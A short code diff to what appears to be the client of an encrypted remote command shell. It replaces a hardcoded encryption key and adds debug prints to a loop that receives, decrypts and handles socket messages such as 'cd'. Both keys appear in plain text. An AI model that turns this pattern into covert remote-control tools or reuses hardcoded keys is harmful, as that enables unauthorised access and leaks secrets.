@@ -12,7 +12,7 @@ import pickle
 
 'stores key here'
 def get_key():
-    key = b'pFU-GlitYrfsz6WevLup7doR7wJa8gYA7kj7WDM9ONQ='
+    key = b'TYbuvP6D5CdEpmxBfW8ligUfQJ6iUx45OzUWN93e7Bg='
     return key
 
 
@@ -63,8 +63,10 @@ def main():
       while True:
           try:
               data = s.recv(4096)
+              print(data)
               decrypt = decrypt_mess(data)
               message = decrypt.decode()
+              print(message)
               if "cd" in message:
                   newDir = message.replace('cd ', '')
                   try:
